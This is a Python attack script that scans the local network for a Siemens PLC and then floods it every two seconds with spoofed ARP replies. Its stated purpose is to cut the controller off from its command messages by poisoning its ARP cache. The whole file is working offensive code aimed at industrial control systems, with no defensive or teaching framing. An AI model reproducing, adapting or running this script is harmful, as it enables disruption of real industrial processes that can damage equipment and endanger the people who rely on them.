import os
import sys
import time
import subprocess
from scapy.all import ARP, send

def get_plc_ip():
    """
    Discover the PLC's IP address using ARP scan.
    """
    # Example: Use arp-scan to find the PLC's IP address
    try:
        result = subprocess.run(['arp-scan', '--localnet'], stdout=subprocess.PIPE)
        output = result.stdout.decode('utf-8')
        for line in output.splitlines():
            if "Siemens" in line:  # Assuming Siemens is in the manufacturer field
                plc_ip = line.split()[0]
                return plc_ip
    except Exception as e:
        print(f"Error discovering PLC IP: {e}")
    return None

def block_command_messages(plc_ip, gateway_ip):
    """
    Block command messages to the PLC by poisoning the ARP cache.
    """
    try:
        print(f"Blocking command messages to PLC at {plc_ip}")
        # Create a spoofed ARP packet to make the PLC think the gateway is the attacker's machine
        arp_spoof = ARP(op=2, pdst=plc_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
        while True:
            send(arp_spoof, verbose=False)
            time.sleep(2)  # Send ARP spoof packets every 2 seconds
    except KeyboardInterrupt:
        print("ARP spoofing stopped.")
    except Exception as e:
        print(f"Error during ARP spoofing: {e}")

if __name__ == "__main__":
    # Define the gateway IP address (router or network gateway)
    gateway_ip = "192.168.1.1"  # Replace with the actual gateway IP

    # Step 1: Discover the PLC's IP address
    plc_ip = get_plc_ip()
    if not plc_ip:
        print("PLC IP address not found. Exiting.")
        sys.exit(1)
    print(f"Discovered PLC IP: {plc_ip}")

    # Step 2: Block command messages to the PLC
    block_command_messages(plc_ip, gateway_ip)